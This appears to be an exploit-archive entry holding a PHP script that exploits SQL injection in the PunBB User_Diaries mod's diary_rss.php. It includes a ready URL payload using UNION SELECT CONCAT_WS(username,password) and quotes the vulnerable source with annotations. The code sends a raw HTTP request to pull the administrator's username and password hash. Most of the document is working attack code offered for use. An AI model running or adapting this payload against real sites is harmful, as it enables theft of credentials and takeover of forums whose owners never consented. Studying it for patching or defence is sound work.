@@ -1,0 +1,115 @@
+id: 13519
+date: 07/30/2010
+title: PunBB Mod User_Diaries <= 1.1.4 (diary_rss.php) Sql Injection Exploit
+author: StAkeR
+cves: 
+
+=====================================================================
+PunBB Mod User_Diaries <= 1.1.4 (diary_rss.php) Sql Injection Exploit
+=====================================================================
+
+#!/usr/bin/php
+<?PHP
+error_reporting(E_STRICT ^ E_WARNING);
+
+
+/*
+---------------------------------------------------------------------
+PunBB Mod User_Diaries <= 1.1.4 "diary_rss.php" sql injection exploit
+---------------------------------------------------------------------
+download: http://www.punres.org/files.php?pid=467 
+by staker[at]hotmail[dot]it
+---------------------------------------------------------------------
+
+[*] http://[example]/diary_rss.php?id=0+UNION+SELECT+1,CONCAT_WS(0x3a,username,password),3,4,5,6,7,8,9+FROM+foo_users+WHERE+id=2#
+
+
+[EXPLANATION / NOTE: IT WORKS REGARDLESS OF PHP.INI SETTINGS]
+-------------------------------------------------------------
+{1} $user_id become $_GET['id'] variable.
+{2} $user_id become $where variable.
+{3} mysql query -> users AS r ON u.poster_id=r.id".$where." there's no escape & quotes.
+-------------------------------------------------------------
+
+[file: diary_rss.php | line: 69-83]
+
+if (!empty($_GET["id"]))
+{
+	$user_id = $_GET["id"];  <---- {1}
+    $where = " WHERE u.poster_id = ".$user_id;  <---- {2}
+}
+else
+{
+	$user_id = '';
+    $where = '';
+}
+
+
+$result = $db->query("
+SELECT u.id, r.username, u.poster, u.poster_id, u.poster_ip, u.message, u.posted, u.entry_date,
+u.image_ext FROM ".$db->prefix."diary as u LEFT JOIN ".$db->prefix."users AS  
+r ON u.poster_id=r.id".$where." ORDER BY u.posted DESC LIMIT 0,20 <------- {3}
+") or error('Unable to fetch diary entries', __FILE__, __LINE__, $db->error()); 
+
+*********************************************************************************/
+
+echo('
+---------------------------------------------------------------------
+PunBB Mod User_Diaries <= 1.1.4 "diary_rss.php" sql injection exploit
+----------------------------------------------------------------------
+by staker[at]hotmail[dot]it
+
+');
+
+$host = $argv[1];
+$path = $argv[2];
+
+$pre = "punbb_"; // default table_prefix.
+$uid = 2; // default id (admin)
+
+
+$sql = '0+UNION+SELECT+1,CONCAT_WS(0x3a,username,password),3,4,5,6,7'.
+       ",8,9+FROM+{$pre}users+WHERE+id={$uid}%23";
+	   
+
+if ($argc != 3) {
+   die ("Usage: php diary.php localhost /punbb/\n");
+}
+   
+
+
+$packet = "GET {$path}/diary_rss.php?id={$sql} HTTP/1.1\r\n".
+		  "Host: {$host}\r\n".
+		  "User-Agent: Lynx (textmode)\r\n".
+		  "Connection: close\r\n\r\n";
+		  
+        
+if (preg_match('/<title>(.+?)<\/title>/',data_send($target,$packet),$content)) {
+   $array = explode("'",$content[0]);
+   print "Result: $array[1]\n";
+}
+
+else {
+   echo "Exploit failed\n";
+}   
+		
+
+function data_send ($host,$data) {
+   
+    if (!$sock = @fsockopen($host,80)) {
+        die("Connection refused,try again!\n");
+    }   fputs($sock,$data);
+    
+    while (!feof($sock)) { $html .= fgets($sock); }
+    
+    fclose($sock);
+    return $html;
+}   
+
+
+
+?>
+
+
+
+#  0day.today [2023-03-24]  #
